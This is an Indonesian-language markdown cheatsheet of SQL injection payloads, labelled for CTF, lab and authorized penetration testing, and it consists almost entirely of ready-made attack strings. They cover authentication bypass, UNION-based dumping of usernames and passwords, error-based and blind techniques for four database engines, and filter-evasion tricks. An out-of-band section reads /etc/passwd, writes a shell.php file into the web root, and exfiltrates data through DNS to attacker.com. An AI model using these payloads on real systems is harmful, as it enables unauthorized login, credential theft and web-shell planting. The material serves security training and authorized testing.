---
title: "SQL Injection Payload Cheatsheet"
section: resources
topic: cheatsheets
date_created: 2026-06-04
last_updated: 2026-06-04
tags: [sql-injection, payload, cheatsheet, web-security]
---

# SQL Injection Payload Cheatsheet

> Digunakan untuk CTF, lab, dan authorized penetration testing saja.

---

## Testing Awal (Deteksi)

```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 'x'='x
1' AND '1'='1
1' AND '1'='2
```

Kalau salah satu dari ini menghasilkan error, output yang berbeda, atau login berhasil: kemungkinan ada SQL injection.

---

## Authentication Bypass

```sql
-- Login tanpa password
admin'--
admin'#
admin'/*
' OR 1=1--
' OR 1=1#
') OR '1'='1'--
' OR ''='

-- Bypass login form username/password
username: admin'--
password: (apapun)

username: ' OR 1=1--
password: (apapun)
```

---

## Error-Based Detection

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,version()))--
' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL
' AND 1=convert(int,@@version)--

-- Oracle
' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))--
```

---

## UNION-Based

Langkah pertama: cari jumlah kolom.

```sql
-- Cari jumlah kolom dengan ORDER BY
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Terus sampai error, berarti jumlah kolom = angka terakhir yang tidak error

-- Atau pakai UNION NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Setelah tahu jumlah kolom (misal 3), cari kolom yang tampil
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

Setelah tahu posisi kolom yang tampil di halaman:

```sql
-- MySQL: ambil database, user, version
' UNION SELECT 1,database(),version()--
' UNION SELECT 1,user(),@@hostname--

-- Ambil nama tabel
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

-- Ambil nama kolom dari tabel users
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- Dump data
' UNION SELECT 1,username,password FROM users--

-- Gabungkan beberapa kolom jadi satu
' UNION SELECT 1,concat(username,':',password),3 FROM users--
```

---

## Boolean-Based Blind

Tidak ada output langsung, tapi respons halaman berbeda kalau kondisi TRUE vs FALSE.

```sql
-- TRUE condition (halaman normal)
' AND 1=1--
' AND 'a'='a'--

-- FALSE condition (halaman berbeda/error)
' AND 1=2--
' AND 'a'='b'--

-- Cek database length
' AND length(database())=5--
' AND length(database())>4--

-- Cek karakter pertama database name
' AND substring(database(),1,1)='a'--
' AND ascii(substring(database(),1,1))>97--
```

---

## Time-Based Blind

Tidak ada perbedaan respons, tapi kalau kondisi TRUE maka ada delay.

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(length(database())=5,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

---

## Identifikasi Database

```sql
-- MySQL
' AND substring(version(),1,1)='5'--
SELECT @@version
SELECT database()

-- MSSQL
SELECT @@version
SELECT DB_NAME()
SELECT name FROM master.dbo.sysdatabases

-- PostgreSQL
SELECT version()
SELECT current_database()

-- Oracle
SELECT * FROM v$version
SELECT ora_database_name FROM dual
```

---

## Bypass Filter Umum

```sql
-- Bypass spasi
'/**/OR/**/1=1--
'%09OR%091=1--      (tab)
'%0aOR%0a1=1--      (newline)

-- Bypass keyword filter (case variation)
' oR 1=1--
' Or 1=1--
' OR 1=1--
' uNiOn sElEcT--

-- Double encode
%2527 (double URL encoded single quote)

-- Comment variations
'-- -
'--
'#
'/*
```

---

## Out-of-Band (OOB)

```sql
-- MySQL: baca file (butuh FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- MySQL: tulis file (butuh write permission)
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--

-- DNS exfiltration (MySQL, butuh SUPER privilege)
' AND load_file(concat('\\\\',database(),'.attacker.com\\a'))--
```

---

## Referensi Cepat per Database

| | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| Version | `@@version` | `@@version` | `version()` | `v$version` |
| Current DB | `database()` | `DB_NAME()` | `current_database()` | `ora_database_name` |
| List DB | `information_schema.schemata` | `master..sysdatabases` | `pg_database` | `all_databases` |
| List Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| String concat | `concat(a,b)` | `a+b` | `a||b` | `a||b` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_pipe...` |

---

→ [Back to Payloads](README.md)
